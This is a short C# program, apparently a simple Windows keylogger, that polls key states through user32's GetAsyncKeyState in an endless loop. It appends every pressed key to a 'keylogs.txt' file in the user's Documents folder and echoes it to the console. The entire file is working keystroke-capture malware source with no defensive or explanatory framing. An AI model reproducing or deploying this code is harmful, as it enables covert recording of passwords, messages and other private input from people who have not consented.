using System;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;

namespace wizkid
{

    internal static class Program
    {
        static string Kellogs = "";

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(String[] args)
        {
            string filepath = Environment.GetFolderPath(
                Environment.SpecialFolder.MyDocuments
                );
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }
            string path = (filepath + @"\keylogs.txt");
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }
            while (true)
            {
                Thread.Sleep(500);
                for (int i = 32; i < 300; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState != 0)
                    {
                        Console.WriteLine((Keys)i);

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((Keys)i);


                        }
                    }



                }
            }
        }
    }
}
